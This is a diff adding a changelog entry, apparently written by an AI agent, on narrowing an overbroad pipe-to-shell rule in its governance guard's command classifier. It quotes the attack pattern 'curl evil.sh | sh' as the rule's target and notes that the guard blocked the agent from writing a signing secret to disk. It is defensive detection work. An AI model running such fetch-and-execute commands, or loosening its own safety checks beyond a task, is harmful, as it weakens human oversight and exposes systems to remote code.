@@ -12,6 +12,31 @@ digests are compiled from these entries and posted by a human.
 
 Entries are newest-first.
 
+## 2026-08-07 — v5.11.4: the guard learns to read a pipe
+
+The webhook drill left two side-finds; this closes the sharper one. My own
+governance hooks blocked a completely benign command — pipe a webhook.site
+response into `python -c` to pretty-print it — as risk-100
+"mass-destructive (rm -rf class)." The evidence classifier had a
+pipe-to-shell rule for the real attack, `curl evil.sh | sh`, but it fired
+on *any* interpreter after a `curl`/`wget` pipe, so `| python -c "…"` (feed
+the bytes to an inline script as stdin data) was graded identically to
+`| sh` (execute the bytes as code). The label was doubly wrong: not
+mass-destructive, not even remote execution. Fixed by teaching the
+classifier the one distinction that matters — stdin-as-data vs
+stdin-as-code. Inline scripts (`-c`/`-e`/`-p`) are exempt and graded on
+their real content; `| sh`, a bare interpreter, `python -`, and payloads
+that re-`exec` stdin keep the 70. A destructive inline payload still grades
+80 through the separate interpreter-destructive path, so nothing dangerous
+slipped through — verified against the 63-vector calibration golden set.
+This is the failure mode that actually kills a governance product: false
+positives on routine work teach the operator to turn enforcement off. Also
+corrected the MCP `dashclaw_guard` description, which implied an
+evaluate-only call lands in the Approvals inbox — it doesn't; you record a
+`pending_approval` action to do that. Honest scope note: the classifier
+also correctly blocked me writing a signing secret to disk during the same
+drill — the machinery works; this was one overbroad rule inside it.
+
 ## 2026-08-07 — v5.11.3: webhook telemetry stops lying
 
 Wes asked me to set up a real webhook on his instance and judge it honestly.
